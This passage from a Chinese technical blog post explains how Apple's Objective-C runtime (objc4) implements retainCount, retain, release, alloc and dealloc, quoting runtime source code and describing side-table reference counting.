<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- (<span class="built_in">NSUInteger</span>)retainCount &#123;</div><div class="line">    <span class="keyword">return</span> ((<span class="keyword">id</span>)<span class="keyword">self</span>)-&gt;rootRetainCount();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 objc-object.h rootRetainCount:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">inline</span> uintptr_t </div><div class="line">objc_object::rootRetainCount()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (isTaggedPointer()) <span class="keyword">return</span> (uintptr_t)<span class="keyword">this</span>;</div><div class="line">    <span class="keyword">return</span> sidetable_retainCount();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 NSObject.mm sidetable_retainCount:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">uintptr_t</div><div class="line">objc_object::sidetable_retainCount()</div><div class="line">&#123;</div><div class="line">    SideTable&amp; table = SideTables()[<span class="keyword">this</span>];</div><div class="line"></div><div class="line">    size_t refcnt_result = <span class="number">1</span>;</div><div class="line">    </div><div class="line">    table.lock();</div><div class="line">    RefcountMap::iterator it = table.refcnts.find(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">if</span> (it != table.refcnts.end()) &#123;</div><div class="line">        <span class="comment">// this is valid for SIDE_TABLE_RC_PINNED too</span></div><div class="line">        refcnt_result += it-&gt;second &gt;&gt; SIDE_TABLE_RC_SHIFT;</div><div class="line">    &#125;</div><div class="line">    table.unlock();</div><div class="line">    <span class="keyword">return</span> refcnt_result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>it-&gt;second 指向的就是存放引用计数相关的那个 8 位的无符号整型。</p>
<p>上面介绍过 Sidetable 中的几个重要偏移量，通过位移 SIDE_TABLE_RC_SHIFT 可以获取真实的引用计数。</p>
<p>所以，<code>sidetable_retainCount()</code> 中的主要内容就是遍历引用计数表，查找对象获取引用计数 +1 并将结果返回。</p>
<h1 id="retain"><a href="#retain" class="headerlink" title="retain"></a>retain</h1><p>找到 retain 的实现。</p>
<p><strong>objc4 NSObject.mm retain:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">id</span>)<span class="keyword">retain</span> &#123;</div><div class="line">    <span class="keyword">return</span> ((<span class="keyword">id</span>)<span class="keyword">self</span>)-&gt;rootRetain();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 objc-objc.h rootRetain:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Base retain implementation, ignoring overrides.</span></div><div class="line"><span class="comment">// This does not check isa.fast_rr; if there is an RR override then </span></div><div class="line"><span class="comment">// it was already called and it chose to call [super retain].</span></div><div class="line"><span class="keyword">inline</span> <span class="keyword">id</span> </div><div class="line">objc_object::rootRetain()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (isTaggedPointer()) <span class="keyword">return</span> (<span class="keyword">id</span>)<span class="keyword">this</span>;</div><div class="line">    <span class="keyword">return</span> sidetable_retain();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 NSObject.mm sidetable_retain:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span></div><div class="line">objc_object::sidetable_retain()</div><div class="line">&#123;</div><div class="line"><span class="meta">#if SUPPORT_NONPOINTER_ISA</span></div><div class="line">    assert(!isa.nonpointer);</div><div class="line"><span class="meta">#endif</span></div><div class="line">    SideTable&amp; table = SideTables()[<span class="keyword">this</span>];</div><div class="line">    </div><div class="line">    table.lock();</div><div class="line">    size_t&amp; refcntStorage = table.refcnts[<span class="keyword">this</span>];</div><div class="line">    <span class="keyword">if</span> (! (refcntStorage &amp; SIDE_TABLE_RC_PINNED)) &#123;</div><div class="line">        refcntStorage += SIDE_TABLE_RC_ONE;</div><div class="line">    &#125;</div><div class="line">    table.unlock();</div><div class="line"></div><div class="line">    <span class="keyword">return</span> (<span class="keyword">id</span>)<span class="keyword">this</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>refcntStorage += SIDE_TABLE_RC_ONE</code> 让人费解，实际是怎么回事呢？我们通过距离说明：</p>
<p>如果 obj 的引用计数数值为 1（二进制 00000100，因为第一位，第二位用来标识其他内容），现在如果进行 retain，需要对引用计数数值增加 1，那么需要由 00000100 =&gt; 00001000。所以实际上，从整型的角度，是 <code>retainCount + 4</code>，而不是我们理解的 +1。</p>
<p>SIDE_TABLE_RC_ONE 定义是的 1UL&lt;&lt;2，也就是4，所以这里 <code>refcntStorage += SIDE_TABLE_RC_ONE;</code>。</p>
<h1 id="release"><a href="#release" class="headerlink" title="release"></a>release</h1><p><strong>objc4-706 NSObject.mm release:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">oneway</span> <span class="keyword">void</span>)release &#123;</div><div class="line">    ((<span class="keyword">id</span>)<span class="keyword">self</span>)-&gt;rootRelease();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4-706 objc-object.h rootRelease:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">inline</span> <span class="keyword">bool</span> </div><div class="line">objc_object::rootRelease()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (isTaggedPointer()) <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    <span class="keyword">return</span> sidetable_release(<span class="literal">true</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4-706 NSObject.mm sidetable_release:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// rdar://20206767</span></div><div class="line"><span class="comment">// return uintptr_t instead of bool so that the various raw-isa </span></div><div class="line"><span class="comment">// -release paths all return zero in eax</span></div><div class="line">uintptr_t</div><div class="line">objc_object::sidetable_release(<span class="keyword">bool</span> performDealloc)</div><div class="line">&#123;</div><div class="line"><span class="meta">#if SUPPORT_NONPOINTER_ISA</span></div><div class="line">    assert(!isa.nonpointer);</div><div class="line"><span class="meta">#endif</span></div><div class="line">    SideTable&amp; table = SideTables()[<span class="keyword">this</span>];</div><div class="line"></div><div class="line">    <span class="keyword">bool</span> do_dealloc = <span class="literal">false</span>;</div><div class="line"></div><div class="line">    table.lock();</div><div class="line">    RefcountMap::iterator it = table.refcnts.find(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">if</span> (it == table.refcnts.end()) &#123;</div><div class="line">        do_dealloc = <span class="literal">true</span>;</div><div class="line">        table.refcnts[<span class="keyword">this</span>] = SIDE_TABLE_DEALLOCATING;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (it-&gt;second &lt; SIDE_TABLE_DEALLOCATING) &#123;</div><div class="line">        <span class="comment">// SIDE_TABLE_WEAKLY_REFERENCED may be set. Don't change it.</span></div><div class="line">        do_dealloc = <span class="literal">true</span>;</div><div class="line">        it-&gt;second |= SIDE_TABLE_DEALLOCATING;</div><div class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (! (it-&gt;second &amp; SIDE_TABLE_RC_PINNED)) &#123;</div><div class="line">        it-&gt;second -= SIDE_TABLE_RC_ONE;</div><div class="line">    &#125;</div><div class="line">    table.unlock();</div><div class="line">    <span class="keyword">if</span> (do_dealloc  &amp;&amp;  performDealloc) &#123;</div><div class="line">        ((<span class="keyword">void</span>(*)(objc_object *, SEL))objc_msgSend)(<span class="keyword">this</span>, SEL_dealloc);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> do_dealloc;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>看后面几个判断。</p>
<ol>
<li>如果对象记录在引用计数表的最后一个：<code>do_dealloc</code> 设置为 true，引用计数数值设置为 SIDE_TABLE_DEALLOCATING（二进制 00000010）。</li>
<li>如果 8 位的引用计数小于 SIDE_TABLE_DEALLOCATING（二进制 00000010），也就如果是 00000001 或 00000000：<code>do_dealloc</code> 设置为 true，并添加 deallocating 标识位。（但至于有什么用不太理解，希望哪位大神指点一下）。</li>
<li>如果已经 <code>8 位引用计数 &amp; SIDE_TABLE_RC_PINNED</code> ，即对象不在 deallocating，且没有被弱引用，且 8 位没有溢出：8 位引用计数减少 4，即真实引用计数数值 -1。</li>
<li>最后，如果 <code>do_dealloc</code> 和 <code>performDealloc</code>（传入时就已经为 true）都为 ture，执行 SEL_dealloc 释放对象。</li>
<li>方法返回 do_dealloc。</li>
</ol>
<hr>
<p>如果你只想知道 ARC 引用计数相关，那么只需要看上面的代码就可以了。alloc 和 dealloc 主要是对对象的一些内存分配。</p>
<hr>
<h1 id="alloc"><a href="#alloc" class="headerlink" title="alloc"></a>alloc</h1><p>查看 alloc 相关代码。</p>
<p><strong>objc4-706 NSObject.mm alloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">+ (<span class="keyword">id</span>)alloc &#123;</div><div class="line">    <span class="keyword">return</span> _objc_rootAlloc(<span class="keyword">self</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4-706 NSObject.mm _objc_rootAlloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span></div><div class="line">_objc_rootAlloc(Class cls)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> callAlloc(cls, <span class="literal">false</span><span class="comment">/*checkNil*/</span>, <span class="literal">true</span><span class="comment">/*allocWithZone*/</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4-706 NSObject.mm callAlloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Call [cls alloc] or [cls allocWithZone:nil], with appropriate </span></div><div class="line"><span class="comment">// shortcutting optimizations.</span></div><div class="line"><span class="keyword">static</span> ALWAYS_INLINE <span class="keyword">id</span></div><div class="line">callAlloc(Class cls, <span class="keyword">bool</span> checkNil, <span class="keyword">bool</span> allocWithZone=<span class="literal">false</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (slowpath(checkNil &amp;&amp; !cls)) <span class="keyword">return</span> <span class="literal">nil</span>;</div><div class="line"></div><div class="line"><span class="meta">#if __OBJC2__</span></div><div class="line">    <span class="keyword">if</span> (fastpath(!cls-&gt;ISA()-&gt;hasCustomAWZ())) &#123;</div><div class="line">        <span class="comment">// No alloc/allocWithZone implementation. Go straight to the allocator.</span></div><div class="line">        <span class="comment">// fixme store hasCustomAWZ in the non-meta class and </span></div><div class="line">        <span class="comment">// add it to canAllocFast's summary</span></div><div class="line">        <span class="keyword">if</span> (fastpath(cls-&gt;canAllocFast())) &#123;</div><div class="line">            <span class="comment">// No ctors, raw isa, etc. Go straight to the metal.</span></div><div class="line">            <span class="keyword">bool</span> dtor = cls-&gt;hasCxxDtor();</div><div class="line">            <span class="keyword">id</span> obj = (<span class="keyword">id</span>)calloc(<span class="number">1</span>, cls-&gt;bits.fastInstanceSize());</div><div class="line">            <span class="keyword">if</span> (slowpath(!obj)) <span class="keyword">return</span> callBadAllocHandler(cls);</div><div class="line">            obj-&gt;initInstanceIsa(cls, dtor);</div><div class="line">            <span class="keyword">return</span> obj;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            <span class="comment">// Has ctor or raw isa or something. Use the slower path.</span></div><div class="line">            <span class="keyword">id</span> obj = class_createInstance(cls, <span class="number">0</span>);</div><div class="line">            <span class="keyword">if</span> (slowpath(!obj)) <span class="keyword">return</span> callBadAllocHandler(cls);</div><div class="line">            <span class="keyword">return</span> obj;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"><span class="meta">#endif</span></div><div class="line"></div><div class="line">    <span class="comment">// No shortcuts available.</span></div><div class="line">    <span class="keyword">if</span> (allocWithZone) <span class="keyword">return</span> [cls allocWithZone:<span class="literal">nil</span>];</div><div class="line">    <span class="keyword">return</span> [cls alloc];</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>进入方法后先进行 <code>if (slowpath(checkNil &amp;&amp; !cls)) return nil;</code> 判断。</p>
<p><strong>objc4-706 objc-os.h slowpath:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#define fastpath(x) (__builtin_expect(bool(x), 1))</span></div><div class="line"><span class="meta">#define slowpath(x) (__builtin_expect(bool(x), 0))</span></div></pre></td></tr></table></figure>
<p><code>__builtin_expect(exp, n)</code> 方法表示 exp 很有可能为 0，返回值为 exp。你可以将 <code>fastpath(x)</code> 理解成真值判断，<code>slowpath(x)</code> 理解成假值判断。</p>
<p>所以，根据传入值，<code>checkNil</code> 为 false，<code>checkNil &amp;&amp; !cls</code> 也为 false。那么这里不会返回 nil。继续向下阅读。</p>
<p>其后是一个 Objective-C 2.0 的条件编译指令。当然我们现在用的都属于 Objctive-C 2.0，会执行其中代码。首先进行一个判断 <code>if (fastpath(!cls-&gt;ISA()-&gt;hasCustomAWZ()))... else ...</code>，这是判断一个类是否有自定义的 <code>+allocWithZone</code> 实现。</p>
<p>如果没有自定义的 <code>+allocWithZone</code> 实现。进行下一步，又是一个判断：<code>if (fastpath(cls-&gt;canAllocFast()))... else ...</code>，这里只有对象不存在、没有 isa 等情况才会为真值。所以之间看 else 内容。</p>
<p>else 代码块中调用了 <code>id obj = class_createInstance(cls, 0);</code>。查看内容时注意查看 <code>objc-runtime-new.h</code> 中的内容而不是 <code>objc-runtime-old.mm</code> 中的内容（你可以注意到 <code>objc-runtime-new.h</code> 顶部的 Coptyright 是 Copyright (c) 2005-2007 Apple Inc.  All Rights Reserved.）</p>
<p>在 <code>objc-runtime-new.mm</code> 中 <code>canAllocFast()</code> 定义如下：</p>
<p><strong>objc4-706 objc-runtime-new.h canAllocFast:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#if FAST_ALLOC</span></div><div class="line">    <span class="keyword">bool</span> canAllocFast() &#123;</div><div class="line">        <span class="keyword">return</span> bits &amp; FAST_ALLOC;</div><div class="line">    &#125;</div><div class="line"><span class="meta">#else</span></div><div class="line">    <span class="keyword">bool</span> canAllocFast() &#123;</div><div class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</div><div class="line">    &#125;</div><div class="line"><span class="meta">#endif</span></div></pre></td></tr></table></figure>
<p>再看 FAST_ALLOC 定义，观察下图：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_Advanced-iOS-Study-objc-Memory-2-02.png" alt="FAST_ALLOC"></p>
<p>发现，<code>#elif 1</code> 直接拦截了下面的 define，所以 <code>#if FAST_ALLOC</code> 不起作用（这里我也不是很确定，哪位大神指点一下）。所以，<code>canAllocFast()</code> 返回 false，<code>fastpath(cls-&gt;canAllocFast())</code> 判断为假。</p>
<p>执行</p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// Has ctor or raw isa or something. Use the slower path.</span></div><div class="line"><span class="keyword">id</span> obj = class_createInstance(cls, <span class="number">0</span>);</div><div class="line"><span class="keyword">if</span> (slowpath(!obj)) <span class="keyword">return</span> callBadAllocHandler(cls);</div><div class="line"><span class="keyword">return</span> obj;</div></pre></td></tr></table></figure>
<p><strong>objc4 objc-runtime-new.mm class_createInstance:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span> </div><div class="line">class_createInstance(Class cls, size_t extraBytes)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">return</span> _class_createInstanceFromZone(cls, extraBytes, <span class="literal">nil</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 objc-runtime-new.mm _class_createInstanceFromZone:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span> </div><div class="line">_class_createInstanceFromZone(Class cls, size_t extraBytes, <span class="keyword">void</span> *zone)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">void</span> *bytes;</div><div class="line">    size_t size;</div><div class="line"></div><div class="line">    <span class="comment">// Can't create something for nothing</span></div><div class="line">    <span class="keyword">if</span> (!cls) <span class="keyword">return</span> <span class="literal">nil</span>;</div><div class="line"></div><div class="line">    <span class="comment">// Allocate and initialize</span></div><div class="line">    size = cls-&gt;alignedInstanceSize() + extraBytes;</div><div class="line"></div><div class="line">    <span class="comment">// CF requires all objects be at least 16 bytes.</span></div><div class="line">    <span class="keyword">if</span> (size &lt; <span class="number">16</span>) size = <span class="number">16</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (zone) &#123;</div><div class="line">        bytes = malloc_zone_calloc((malloc_zone_t *)zone, <span class="number">1</span>, size);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        bytes = calloc(<span class="number">1</span>, size);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> objc_constructInstance(cls, bytes);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>传入的 <code>extraBytes</code> 为0，<code>zone</code> 为 nil，那么主要执行的语句是 <code>bytes = calloc(1, size);</code> 和 <code>return objc_constructInstance(cls, bytes);</code>。bytes 是对象所需内存空间。</p>
<blockquote>
<p><strong>FYI:</strong><br><code>calloc(size_t __count, size_t __size)</code> 是 C 语言中的方法，用来在内存的动态存储区中分配 n 个长度为size的连续空间，函数返回一个指向分配起始地址的指针。如果分配不成功，返回NULL。</p>
</blockquote>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">objc_constructInstance(Class cls, <span class="keyword">void</span> *bytes) </div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!cls  ||  !bytes) <span class="keyword">return</span> <span class="literal">nil</span>;</div><div class="line"></div><div class="line">    <span class="keyword">id</span> obj = (<span class="keyword">id</span>)bytes;</div><div class="line"></div><div class="line">    obj-&gt;initIsa(cls);</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (cls-&gt;hasCxxCtor()) &#123;</div><div class="line">        <span class="keyword">return</span> object_cxxConstructFromClass(obj, cls);</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        <span class="keyword">return</span> obj;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>objc_constructInstance</code> 方法中，将 <code>bytes</code>（指向分对象的指针）定义为 <code>obj</code>，并将 <code>obj</code> 的 isa 赋值为传入的 cls。最后返回 obj。</p>
<blockquote>
<p><strong>FYI:</strong><br>hasCxxCtor() 是判断当前 class 或者 superclass 是否有 .cxx_construct 构造方法的实现。<br>hasCxxDtor() 是判断判断当前 class 或者 superclass 是否有 .cxx_destruct 析构方法的实现。<br>参考：<a href="http://ios.jobbole.com/90310/" target="_blank" rel="external">Objc 对象的今生今世</a></p>
</blockquote>
<h1 id="dealloc"><a href="#dealloc" class="headerlink" title="dealloc"></a>dealloc</h1><p>找到 dealloc 的实现。</p>
<p><strong>objc4 NSObject.mm dealloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">- (<span class="keyword">void</span>)dealloc &#123;</div><div class="line">    _objc_rootDealloc(<span class="keyword">self</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 NSObject.mm _objc_rootDealloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span></div><div class="line">_objc_rootDealloc(<span class="keyword">id</span> obj)</div><div class="line">&#123;</div><div class="line">    assert(obj);</div><div class="line"></div><div class="line">    obj-&gt;rootDealloc();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 NSObject.mm _objc_rootDealloc:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">inline</span> <span class="keyword">void</span></div><div class="line">objc_object::rootDealloc()</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (isTaggedPointer()) <span class="keyword">return</span>;</div><div class="line">    object_dispose((<span class="keyword">id</span>)<span class="keyword">this</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<blockquote>
<p><strong>FYI:</strong><br><a href="http://blog.devtang.com/2014/05/30/understand-tagged-pointer/" target="_blank" rel="external">深入理解Tagged Pointer</a></p>
</blockquote>
<p><strong>objc4 objc-runtime-new.mm object_dispose:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">id</span> </div><div class="line">object_dispose(<span class="keyword">id</span> obj)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (!obj) <span class="keyword">return</span> <span class="literal">nil</span>;</div><div class="line"></div><div class="line">    objc_destructInstance(obj);    </div><div class="line">    free(obj);</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="literal">nil</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 objc-runtime-new.mm objc_destructInstance:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/***********************************************************************</span></div><div class="line">* objc_destructInstance</div><div class="line">* Destroys an instance without freeing memory. </div><div class="line">* Calls C++ destructors.</div><div class="line">* Calls ARC ivar cleanup.</div><div class="line">* Removes associative references.</div><div class="line">* Returns `obj`. Does nothing if `obj` is nil.</div><div class="line">**********************************************************************/</div><div class="line"><span class="keyword">void</span> *objc_destructInstance(<span class="keyword">id</span> obj) </div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (obj) &#123;</div><div class="line">        <span class="comment">// Read all of the flags at once for performance.</span></div><div class="line">        <span class="keyword">bool</span> cxx = obj-&gt;hasCxxDtor();</div><div class="line">        <span class="keyword">bool</span> assoc = obj-&gt;hasAssociatedObjects();</div><div class="line"></div><div class="line">        <span class="comment">// This order is important.</span></div><div class="line">        <span class="keyword">if</span> (cxx) object_cxxDestruct(obj);</div><div class="line">        <span class="keyword">if</span> (assoc) _object_remove_assocations(obj);</div><div class="line">        obj-&gt;clearDeallocating();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> obj;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 objc-object.h clearDeallocating:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">inline</span> <span class="keyword">void</span> </div><div class="line">objc_object::clearDeallocating()</div><div class="line">&#123;</div><div class="line">    sidetable_clearDeallocating();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>objc4 NSObject.mm sidetable_clearDeallocating:</strong></p>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">void</span> </div><div class="line">objc_object::sidetable_clearDeallocating()</div><div class="line">&#123;</div><div class="line">    SideTable&amp; table = SideTables()[<span class="keyword">this</span>];</div><div class="line"></div><div class="line">    <span class="comment">// clear any weak table items</span></div><div class="line">    <span class="comment">// clear extra retain count and deallocating bit</span></div><div class="line">    <span class="comment">// (fixme warn or abort if extra retain count == 0 ?)</span></div><div class="line">    table.lock();</div><div class="line">    RefcountMap::iterator it = table.refcnts.find(<span class="keyword">this</span>);</div><div class="line">    <span class="keyword">if</span> (it != table.refcnts.end()) &#123;</div><div class="line">        <span class="keyword">if</span> (it-&gt;second &amp; SIDE_TABLE_WEAKLY_REFERENCED) &#123;</div><div class="line">            weak_clear_no_lock(&amp;table.weak_table, (<span class="keyword">id</span>)<span class="keyword">this</span>);</div><div class="line">        &#125;</div><div class="line">        table.refcnts.erase(it);</div><div class="line">    &#125;</div><div class="line">    table.unlock();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>所以，<code>objc_destructInstance(obj);</code> 中进行了销毁实例但不释放内存，调用了 C++ 的析构函数（如果对象有），处理先关的对象（如果有），最后调用 <code>obj-&gt;clearDeallocating();</code> 清除 weak 引用、清除多余的 retain count。<code>objc_destructInstance(obj);</code> 之后是 <code>free(obj);</code> 释放 obj 占用的内存空间。</p>
<p>#Other</p>
<p>（在写这边文章的时候，我怎么感觉我最大的感触是，C++ 不懂。。）</p>
<p>写本篇博文时参考的所有资料：</p>
<blockquote>
